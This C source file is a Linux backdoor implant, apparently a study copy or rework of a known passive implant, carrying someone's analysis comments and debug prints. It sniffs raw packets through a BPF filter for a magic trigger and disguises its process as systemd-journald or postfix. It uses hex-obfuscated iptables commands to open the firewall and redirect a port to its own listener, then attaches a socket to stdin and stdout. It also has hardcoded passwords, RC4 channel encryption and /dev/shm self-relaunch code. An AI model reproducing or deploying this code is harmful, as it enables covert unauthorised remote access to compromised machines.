#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/termios.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <netdb.h>
#include <sys/prctl.h>
#include <libgen.h>
#include <sys/time.h>
#include <time.h>
#include <linux/types.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <errno.h>
#include <strings.h>

// #include <netinet/ip.h>
// #include <netinet/tcp.h>

// IP header (struct iphdr) definition
#include <linux/ip.h>
//TCP header (struct tcphdr) definition
#include <linux/tcp.h>

#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif

extern char **environ;

#define __SID ('S' << 8)
#define I_PUSH (__SID | 2)

struct sniff_ip {
        unsigned char   ip_vhl;
        unsigned char   ip_tos;
        unsigned short int ip_len;
        unsigned short int ip_id;
        unsigned short int ip_off;
        #define IP_RF 0x8000
        #define IP_DF 0x4000
        #define IP_MF 0x2000
        #define IP_OFFMASK 0x1fff
        unsigned char   ip_ttl;
        unsigned char   ip_p;
        unsigned short int ip_sum;
        struct  in_addr ip_src,ip_dst;
};
#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)  (((ip)->ip_vhl) >> 4)

typedef unsigned int tcp_seq;
struct sniff_tcp {
        unsigned short int th_sport;
        unsigned short int th_dport;
        tcp_seq th_seq;
        tcp_seq th_ack;
        unsigned char   th_offx2;
        #define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
        unsigned char   th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        unsigned short int th_win;
        unsigned short int th_sum;
        unsigned short int th_urp;
} __attribute__ ((packed));

struct sniff_udp {
        uint16_t uh_sport;
        uint16_t uh_dport;
        uint16_t uh_ulen;
        uint16_t uh_sum;
} __attribute__ ((packed));

struct magic_packet{
        unsigned int    flag;
        in_addr_t       ip;
        unsigned short  port;
        char   pass[14];
} __attribute__ ((packed));

#ifndef uchar
#define uchar unsigned char
#endif

typedef struct {
        uchar   state[256];
        uchar   x, y;
} rc4_ctx;

extern char *ptsname(int);
extern int grantpt(int fd);
extern int unlockpt(int fd);
extern int ioctl (int __fd, unsigned long int __request, ...) __THROW;

#define TIOCSCTTY 0x540E
#define TIOCGWINSZ 0x5413
#define TIOCSWINSZ 0x5414
#define ECHAR 0x0b

#define BUF 32768

struct  config {
        char    stime[4];
        char    etime[4];
        char    mask[512];
        char    pass[14];
        char    pass2[14];
} __attribute__ ((packed));

struct config cfg;
int     pty, tty;
int     godpid;
char pid_path[50];

int shell(int, char *, char *);
void getshell(char *ip, int);

char *argv0 = NULL;

rc4_ctx crypt_ctx, decrypt_ctx;

void xchg(uchar *a, uchar *b)
{
        uchar   c = *a;
        *a = *b;
        *b = c;
}

void    rc4_init (uchar *key, int len, rc4_ctx *ctx)
{
        uchar   index1, index2;
        uchar   *state = ctx->state;
        uchar   i;

        i = 0;
        do {
                state[i] = i;
                i++;
        } while (i);

        ctx->x = ctx->y = 0;
        index1 = index2 = 0;
        do {
                index2 = key[index1] + state[i] + index2;
                xchg(&state[i], &state[index2]);
                index1++;
                if (index1 >= len)
                        index1 = 0;
                i++;
        } while (i);
}

void    rc4 (uchar *data, int len, rc4_ctx *ctx)
{
        uchar   *state = ctx->state;
        uchar   x = ctx->x;
        uchar   y = ctx->y;
        int     i;

        for (i = 0; i < len; i++) {
                uchar xor;

                x++;
                y = state[x] + y;
                xchg(&state[x], &state[y]);

                xor = state[x] + state[y];
                data[i] ^= state[xor];
        }

        ctx->x = x;
        ctx->y = y;
}

int cwrite(int fd, void *buf, int count)
{
        uchar    *tmp;
        int     ret;

        if (!count)
                return 0;
        tmp = malloc(count);
        if (!tmp)
                return 0;
        memcpy(tmp, buf, count);
        rc4(tmp, count, &crypt_ctx);
        ret = write(fd, tmp, count);
        free(tmp);
        return ret;
}

int cread(int fd, void *buf, int count)
{
        int     i;

        if (!count)
                return 0;
        i = read(fd, buf, count);

        if (i > 0)
                rc4(buf, i, &decrypt_ctx);
        return i;
}

static void remove_pid(char *pp)
{
        unlink(pp);
}

static void setup_time(char *file)
{
        struct timeval tv[2];

        tv[0].tv_sec = 1225394236;
        tv[0].tv_usec = 0;

        tv[1].tv_sec = 1225394236;
        tv[1].tv_usec = 0;

        utimes(file, tv);
}

static void terminate(void)
{
        if (getpid() == godpid)
                remove_pid(pid_path);

        _exit(EXIT_SUCCESS);
}

static void on_terminate(int signo)
{
        terminate();
}

static void init_signal(void)
{
        atexit(terminate);
        signal(SIGTERM, on_terminate);
        return;
}

void sig_child(int i)
{
        signal(SIGCHLD, sig_child);
        waitpid(-1, NULL, WNOHANG);
}

int ptym_open(char *pts_name)
{
        char *ptr;
        int fd;

        strcpy(pts_name,"/dev/ptmx");
        if ((fd = open(pts_name,O_RDWR)) < 0) {
                return -1;
        }

        if (grantpt(fd) < 0) {
                close(fd);
                return -2;
        }

        if (unlockpt(fd) < 0) {
                close(fd);
                return -3;
        }

        if ((ptr = ptsname(fd)) == NULL) {
                close(fd);
                return -4;
        }

        strcpy(pts_name,ptr);

        return fd;
}

int ptys_open(int fd,char *pts_name)
{
        int fds;

        if ((fds = open(pts_name,O_RDWR)) < 0) {
                close(fd);
                return -5;
        }


        if (ioctl(fds,I_PUSH,"ptem") < 0) {
                return fds;
        }

        if (ioctl(fds,I_PUSH,"ldterm") < 0) {
        return fds;
        }

        if (ioctl(fds,I_PUSH,"ttcompat") < 0) {
                return fds;
        }

        return fds;
}

int open_tty()
{
        char pts_name[20];

        pty = ptym_open(pts_name);

        tty = ptys_open(pty,pts_name);

        if (pty >= 0 && tty >=0 )
                return 1;
        return 0;
}

int try_link(in_addr_t ip, unsigned short port)
{
        struct sockaddr_in serv_addr;
        int sock;

        bzero(&serv_addr, sizeof(serv_addr));

        serv_addr.sin_addr.s_addr = ip;

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                return -1;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = port;

        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr)) == -1 ) {
                close(sock);
                return -1;
        }
        return sock;
}

int mon(in_addr_t ip, unsigned short port)
{
        struct sockaddr_in remote;
        int      sock;
        int      s_len;

        bzero(&remote, sizeof(remote));
        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < -1) {
                return -1;
        }
        remote.sin_family = AF_INET;
        remote.sin_port   = port;
        remote.sin_addr.s_addr = ip;

        if ((s_len = sendto(sock, "1", 1, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr))) < 0) {
                close(sock);
                return -1;
        }
        close(sock);
        return s_len;
}

int set_proc_name(int argc, char **argv, char *new)
{
        size_t size = 0;
        int i;
        char *raw = NULL;
        char *last = NULL;

        argv0 = argv[0];

        for (i = 0; environ[i]; i++)
                size += strlen(environ[i]) + 1;

        raw = (char *) malloc(size);
        if (NULL == raw)
                return -1;

        for (i = 0; environ[i]; i++)
        {
                memcpy(raw, environ[i], strlen(environ[i]) + 1);
                environ[i] = raw;
                raw += strlen(environ[i]) + 1;
        }

        last = argv[0];

        for (i = 0; i < argc; i++)
                last += strlen(argv[i]) + 1;
        for (i = 0; environ[i]; i++)
                last += strlen(environ[i]) + 1;

        memset(argv0, 0x00, last - argv0);
        strncpy(argv0, new, last - argv0);

        prctl(PR_SET_NAME, (unsigned long) new);
        return 0;
}

int to_open(char *name, char *tmp)
{
        char cmd[256] = {0};
        char fmt[] = {
                0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x72, 0x6d, 0x20, 0x2d, 0x66,
                0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d, 0x2f,
                0x25, 0x73, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x70,
                0x20, 0x25, 0x73, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73,
                0x68, 0x6d, 0x2f, 0x25, 0x73, 0x20, 0x26, 0x26, 0x20, 0x2f,
                0x62, 0x69, 0x6e, 0x2f, 0x63, 0x68, 0x6d, 0x6f, 0x64, 0x20,
                0x37, 0x35, 0x35, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73,
                0x68, 0x6d, 0x2f, 0x25, 0x73, 0x20, 0x26, 0x26, 0x20, 0x2f,
                0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d, 0x2f, 0x25, 0x73,
                0x20, 0x2d, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x20, 0x26, 0x26,
                0x20, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x72, 0x6d, 0x20, 0x2d,
                0x66, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d,
                0x2f, 0x25, 0x73, 0x00}; // /bin/rm -f /dev/shm/%s;/bin/cp %s /dev/shm/%s && /bin/chmod 755 /dev/shm/%s && /dev/shm/%s --init && /bin/rm -f /dev/shm/%s

        snprintf(cmd, sizeof(cmd), fmt, tmp, name, tmp, tmp, tmp, tmp);
        system(cmd);
        sleep(2);
        if (access(pid_path, R_OK) == 0)
                return 0;
        return 1;
}

int logon(const char *hash)
{
        int x = 0;
        x = memcmp(cfg.pass, hash, strlen(cfg.pass));
        if (x == 0)
                return 0;
        x = memcmp(cfg.pass2, hash, strlen(cfg.pass2));
        if (x == 0)
                return 1;

        return 2;
}

void packet_loop()
{
        int sock, r_len, pid, scli, size_ip, size_tcp;
        socklen_t psize;
        uchar buff[512];
        const struct sniff_ip *ip;
        const struct sniff_tcp *tcp;
        struct magic_packet *mp;
        const struct sniff_udp *udp;
        in_addr_t bip;
        char *pbuff = NULL;
        
        //
        // Filter Options Build Filter Struct
        //

        // echo vish | nc <> 22
        struct sock_fprog filter;
        struct sock_filter bpf_code[] = {
            /* data */
            { 0x28, 0, 0, 0x0000000c },
            { 0x15, 0, 13, 0x00000800 },
            { 0x30, 0, 0, 0x00000017 },
            { 0x15, 0, 11, 0x00000006 },
            { 0x28, 0, 0, 0x00000014 },
            { 0x45, 9, 0, 0x00001fff },
            { 0xb1, 0, 0, 0x0000000e },
            { 0x50, 0, 0, 0x0000001a },
            { 0x54, 0, 0, 0x000000f0 },
            { 0x74, 0, 0, 0x00000002 },
            { 0xc, 0, 0, 0x00000000 },
            { 0x7, 0, 0, 0x00000000 },
            { 0x48, 0, 0, 0x0000000e },
            { 0x15, 0, 1, 0x00007669 },
            { 0x6, 0, 0, 0x00040000 },
            { 0x6, 0, 0, 0x00000000 },
        };

        filter.len = sizeof(bpf_code)/sizeof(bpf_code[0]);
        filter.filter = bpf_code;

        //
        // Build a rawsocket that binds the NIC to receive Ethernet frames
        //

        if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 1)
                return;

        //
        // Set a packet filter
        //

        if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) == -1) {
                return;
        }


        //
        // Loop to Read Packets in 512 Chunks
        //


        while (1) {
                memset(buff, 0, 512);
                psize = 0;
                r_len = recvfrom(sock, buff, 512, 0x0, NULL, NULL);

                struct iphdr *ip_header = (struct iphdr*)(buff + sizeof (struct ethhdr));
                int iphdrlen = ip_header->ihl*4;
                struct sockaddr_in source, dest;

                memset(&source, 0, sizeof(source));
                source.sin_addr.s_addr = ip_header->saddr;

                memset(&dest, 0, sizeof(dest));
                dest.sin_addr.s_addr = ip_header->daddr;

                // printf("PROTCOL VAL %d\n", ip_header->protocol);

                struct tcphdr *tcp;


                ip = (struct sniff_ip *)(buff+14);
                // printf("TCP SPort %u\n", ip->ip_src.s_addr);
                size_ip = IP_HL(ip)*4;
                if (size_ip < 20) continue;

                // determine protocl from packet (offset 14)
                switch(ip->ip_p) {
                        case IPPROTO_TCP:
                                printf("Here\n");
                                tcp = (struct tcphdr*)(buff + iphdrlen + sizeof(struct ethhdr));
                                // printf("Source port: %u\n", htons(tcp->source));
                                // printf("Dest port: %u\n", htons(tcp->dest));
                                // printf("Source IP: %s\n", inet_ntoa(source.sin_addr));

                                // tcp = (struct sniff_tcp*)(buff+14+size_ip);
                                // printf("TCP SPort %u\n", htons(tcp->th_sport));
                                // printf("TCP Dport: %u\n", htons(tcp->th_dport));
                                // size_tcp = TH_OFF(tcp)*4;
                                // mp = (struct magic_packet *)(buff+14+size_ip+size_tcp);
                                // printf("MP SPort %d\n", mp->ip);
                                // printf("MP Dport: %u\n", mp->port);
                                break;
                        case IPPROTO_UDP:
                                udp = (struct sniff_udp *)(ip+1);
                                mp = (struct magic_packet *)(udp+1);
                                break;
                        case IPPROTO_ICMP:
                                pbuff = (char *)(ip+1);
                                mp = (struct magic_packet *)(pbuff+8);
                                break;
                        default:
                                break;
                }
                
                // if magic packet is set process

                if (mp) {
                        pid = fork();
                        if (pid) {
                                waitpid(pid, NULL, WNOHANG);
                                pid = wait(NULL);
                        }
                        else {
                                // printf("shell?");
                                int cmp = 0;
                                char sip[20] = {0};
                                char pname[] = {0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x69, 0x62, 0x65, 0x78, 0x65, 0x63, 0x2f, 0x70, 0x6f, 0x73, 0x74, 0x66, 0x69, 0x78, 0x2f, 0x6d, 0x61, 0x73, 0x74, 0x65,
 0x72, 0x00}; // /usr/libexec/postfix/master

                                // if (fork()) exit(0);
                                chdir("/");
                                setsid();
                                signal(SIGHUP, SIG_DFL);
                                memset(argv0, 0, strlen(argv0));
                                strcpy(argv0, pname); // sets process name (/usr/libexec/postfix/master) 
                                prctl(PR_SET_NAME, (unsigned long) pname);

                                getshell(inet_ntoa(source.sin_addr), ntohs(tcp->dest));

                                exit(0);
                        }
                }

        }
        // close(sock);
}

int b(int *p)
{
        int port;
        struct sockaddr_in my_addr;
        int sock_fd;
        int flag = 1;

        if( (sock_fd = socket(AF_INET,SOCK_STREAM,0)) == -1 ){
                return -1;
        }

        setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, (char*)&flag,sizeof(flag));

        my_addr.sin_family = AF_INET;
        my_addr.sin_addr.s_addr = 0;

        for (port = 42391; port < 43391; port++) {
                my_addr.sin_port = htons(port);
                if( bind(sock_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr)) == -1 ){
                        continue;
                }
                printf("Listening on port %d\n", port);
                if( listen(sock_fd,1) == 0 ) {
                        *p = port;
                        return sock_fd;
                }
                close(sock_fd);
        }
        return -1;
}

int w(int sock)
{
        socklen_t size;
        struct sockaddr_in remote_addr;
        int sock_id;

        size = sizeof(struct sockaddr_in);
        if( (sock_id = accept(sock,(struct sockaddr *)&remote_addr, &size)) == -1 ){
                return -1;
        }

        close(sock);
        return sock_id;

}

void getshell(char *ip, int fromport)
{
        int  sock, sockfd, toport;
        char cmd[512] = {0}, rcmd[512] = {0}, dcmd[512] = {0};
        char cmdfmt[] = {
                        0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
                        0x65, 0x73, 0x20, 0x2d, 0x74, 0x20, 0x6e, 0x61, 0x74, 0x20, 0x2d, 0x41,
                        0x20, 0x50, 0x52, 0x45, 0x52, 0x4f, 0x55, 0x54, 0x49, 0x4e, 0x47, 0x20,
                        0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
                        0x20, 0x2d, 0x2d, 0x64, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x25, 0x64, 0x20,
                        0x2d, 0x6a, 0x20, 0x52, 0x45, 0x44, 0x49, 0x52, 0x45, 0x43, 0x54, 0x20,
                        0x2d, 0x2d, 0x74, 0x6f, 0x2d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x20, 0x25,
                        0x64, 0x00}; // /sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        char rcmdfmt[] = {
                        0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
                        0x65, 0x73, 0x20, 0x2d, 0x74, 0x20, 0x6e, 0x61, 0x74, 0x20, 0x2d, 0x44,
                        0x20, 0x50, 0x52, 0x45, 0x52, 0x4f, 0x55, 0x54, 0x49, 0x4e, 0x47, 0x20,
                        0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
                        0x20, 0x2d, 0x2d, 0x64, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x25, 0x64, 0x20,
                        0x2d, 0x6a, 0x20, 0x52, 0x45, 0x44, 0x49, 0x52, 0x45, 0x43, 0x54, 0x20,
                        0x2d, 0x2d, 0x74, 0x6f, 0x2d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x20, 0x25,
                        0x64, 0x00}; // /sbin/iptables -t nat -D PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        char inputfmt[] = {
                        0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
                        0x65, 0x73, 0x20, 0x2d, 0x49, 0x20, 0x49, 0x4e, 0x50, 0x55, 0x54, 0x20,
                        0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
                        0x20, 0x2d, 0x6a, 0x20, 0x41, 0x43, 0x43, 0x45, 0x50, 0x54, 0x00}; // /sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT
        char dinputfmt[] = {
                        0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
                        0x65, 0x73, 0x20, 0x2d, 0x44, 0x20, 0x49, 0x4e, 0x50, 0x55, 0x54, 0x20,
                        0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
                        0x20, 0x2d, 0x6a, 0x20, 0x41, 0x43, 0x43, 0x45, 0x50, 0x54, 0x00}; // /sbin/iptables -D INPUT -p tcp -s %s -j ACCEPT

        sockfd = b(&toport); // looks like it selects random ephemral port here
        printf("sockfd: %d\n", sockfd);
        if (sockfd == -1) return;

        snprintf(cmd, sizeof(cmd), inputfmt, ip);
        snprintf(dcmd, sizeof(dcmd), dinputfmt, ip);

        system(cmd); // executes /sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT 
        sleep(1);
        memset(cmd, 0, sizeof(cmd));
        snprintf(cmd, sizeof(cmd), cmdfmt, ip, fromport, toport);
        snprintf(rcmd, sizeof(rcmd), rcmdfmt, ip, fromport, toport);
        printf("\nwhat: %s\n", cmd);

        system(cmd); // executes /sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        sleep(1);
        sock = w(sockfd); // creates a sock that listens on port specified earlier

        if( sock < 0 ){
                printf("I fucked up\n");
                close(sock);
                return;
        }

        shell(sock, rcmd, dcmd); 
        close(sock);
}

int shell(int sock, char *rcmd, char *dcmd)
{
 
        // write(sock, "hi\n", 3);
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        execve("/usr/bin/whoami", 0, 0);

        // envp[0] = home;
        // // envp[1] = ps;
        // envp[2] = histfile;
        // envp[3] = mshist;
        // envp[4] = ipath;
        // envp[5] = term;
        // envp[6] = NULL;

        // write(sock, "3458", 4);
        // if (!open_tty()) {
        //         if (!fork()) {
        //                 dup2(sock, 0);
        //                 dup2(sock, 1);
        //                 dup2(sock, 2);
        //                 // execve(sh, argvv, envp);
        //                 execve(sh, args, NULL);
        //         }
        //         close(sock);
        //         return 0;
        // }

        close(sock);
        // close(pty);
        // waitpid(subshell, NULL, 0);
        // vhangup();
        // exit(0);
}

int main(int argc, char *argv[])
{
        char hash[] = {0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00}; // justforfun
        char hash2[]= {0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74, 0x00}; // socket
        char *self[] = {
                "/sbin/udevd -d",
                "/sbin/mingetty /dev/tty7",
                "/usr/sbin/console-kit-daemon --no-daemon",
                "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event",
                "dbus-daemon --system",
                "hald-runner",
                "pickup -l -t fifo -u",
                "avahi-daemon: chroot helper",
                "/sbin/auditd -n",
                "/usr/lib/systemd/systemd-journald"
        };

        pid_path[0] = 0x2f; pid_path[1] = 0x76; pid_path[2] = 0x61;
        pid_path[3] = 0x72; pid_path[4] = 0x2f; pid_path[5] = 0x72;
        pid_path[6] = 0x75; pid_path[7] = 0x6e; pid_path[8] = 0x2f;
        pid_path[9] = 0x68; pid_path[10] = 0x61; pid_path[11] = 0x6c;
        pid_path[12] = 0x64; pid_path[13] = 0x72; pid_path[14] = 0x75;
        pid_path[15] = 0x6e; pid_path[16] = 0x64; pid_path[17] = 0x2e;
        pid_path[18] = 0x70; pid_path[19] = 0x69; pid_path[20] = 0x64;
        pid_path[21] = 0x00; // /var/run/haldrund.pid

        if (getuid() != 0) {
                printf("Error\n");
                return 0;
        }

        // if (argc == 1) {
        //         if (to_open(argv[0], "kdmtmpflush") == 0)
        //                 _exit(0);
        //         _exit(-1);
        // }

        // bzero(&cfg, sizeof(cfg));

        // setup_time(argv[0]);

        set_proc_name(argc, argv, "/usr/lib/systemd/systemd-journald");

        if (fork()) exit(0);
        init_signal();
        signal(SIGCHLD, sig_child);
        godpid = getpid();

        // close(open(pid_path, O_CREAT|O_WRONLY, 0644));

        signal(SIGCHLD,SIG_IGN);
        setsid();
        packet_loop();
        return 0;
} 